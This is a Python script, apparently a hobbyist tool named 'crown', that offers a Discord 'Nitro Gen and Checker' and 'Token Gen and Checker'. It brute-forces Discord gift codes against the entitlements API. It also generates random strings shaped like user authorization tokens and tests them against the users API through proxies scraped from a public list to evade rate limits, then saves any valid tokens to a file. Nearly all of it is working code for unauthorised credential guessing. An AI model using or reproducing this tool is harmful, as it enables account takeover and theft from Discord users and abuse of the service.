import os
import random
import string
import time
import ctypes
import sys
from colorama import Fore
import requests
from itertools import cycle
import base64
from random import randint
from lxml.html import fromstring
import traceback



def slowprint(s, c, newLine = True):
	for c in s + '\n':
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(1./30)



def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    if os.name == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW('crown')
    else: 
        print('crown')

    print(f'''            

                                     
    {Fore.RED}                                  ░█████╗░██████╗░░█████╗░░██╗░░░░░░░██╗███╗░░██╗{Fore.RESET}
    {Fore.LIGHTRED_EX}                                  ██╔══██╗██╔══██╗██╔══██╗░██║░░██╗░░██║████╗░██║{Fore.RESET}
    {Fore.YELLOW}                                  ██║░░╚═╝██████╔╝██║░░██║░╚██╗████╗██╔╝██╔██╗██║{Fore.RESET}
    {Fore.LIGHTYELLOW_EX}                                  ██║░░██╗██╔══██╗██║░░██║░░████╔═████║░██║╚████║{Fore.RESET}
    {Fore.LIGHTCYAN_EX}                                  ╚█████╔╝██║░░██║╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║{Fore.RESET}
    {Fore.BLUE}                                  ░╚════╝░╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝░░╚══╝{Fore.RESET}
               ''')

    time.sleep(2)
    slowprint(f'{Fore.LIGHTBLACK_EX}Made by: {Fore.RESET}{Fore.RED}crown{Fore.RESET}', .02)
    time.sleep(1)

    operation = input(f'''
    {Fore.RED}                                                        whatchu wanna do?{Fore.RESET}

    {Fore.BLUE}                                                   [1] Nitro Gen and Checker
                                                       [2] Token Gen and Checker
                                                       [3] Exit{Fore.RESET}
''')
    if str(operation) == "1":
        generateCheck()
    elif str(operation) == "2":
        tokengen()
    elif str(operation) == "3":
        exit()
    else:
        os.system('cls' if os.name == 'nt' else 'clear')
        print("\n                                                      Incorrect option")
        time.sleep(2)
        main()

def found():
     print("FOUND CODE")
     

def generateCheck():
        while True:
            code = ''.join(random.choices(
                    string.ascii_uppercase + string.digits + string.ascii_lowercase,
                    k = 16
                ))

            url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true"
            s = requests.session()
            response = s.get(url)

            nitro = f'{Fore.LIGHTBLACK_EX}https://discord.gift/{Fore.RESET}' + code

            if 'subscription_plan' in response.text:
                print(f'{Fore.LIGHTGREEN_EX}Valid code{Fore.RESET} | {nitro}')
                break
                found()

            else:
                print(f'{Fore.LIGHTRED_EX}Invalid{Fore.RESET} | {nitro}')
                continue


def get_proxies():
    url = 'https://sslproxies.org/'
    response = requests.get(url)
    parser = fromstring(response.text)
    proxies = set()
    for i in parser.xpath('//tbody/tr')[:10]:
        if i.xpath('.//td[7][contains(text(),"yes")]'):
            proxy = ":".join([i.xpath('.//td[1]/text()')[0], i.xpath('.//td[2]/text()')[0]])
            proxies.add(proxy)
    return proxies

def tokengen():

 N = input("How many you want?: ")
 count = 0
 current_path = os.path.dirname(os.path.realpath(__file__))
 url = "https://discordapp.com/api/v6/users/@me/library"


 while(int(count) < int(N)):
    tokens = []
    base64_string = "=="
    while(base64_string.find("==") != -1):
        sample_string = str(randint(000000000000000000, 999999999999999999))
        sample_string_bytes = sample_string.encode("ascii")
        base64_bytes = base64.b64encode(sample_string_bytes)
        base64_string = base64_bytes.decode("ascii")
    else:
        token = base64_string+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits)
                                                                                      for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
        count += 1
        tokens.append(token)
    proxies = get_proxies()
    proxy_pool = cycle(proxies)

    for token in tokens:
        proxy = next(proxy_pool)
        header = {
            "Content-Type": "application/json",
            "authorization": token
        }
        r = requests.get(url, headers=header, proxies={"http": proxy})
        if r.status_code == 200:
            print("f'{Fore.LIGHTGREEN_EX}Valid{Fore.RESET} | {token}'")
            f = open(current_path+"/"+"workingtokens.txt", "a")
            f.write(token+"\n")
        elif "rate limited." in r.text:
            print("[-] You are being rate limited.")
        else:
            print(f'{Fore.LIGHTRED_EX}Invalid{Fore.RESET} | {token}')
    tokens.remove(token)

def exit():
 print('bye bye darlin')
 time.sleep(2)
 os.system('cls' if os.name == 'nt' else 'clear')
 os.system('exit')

main()



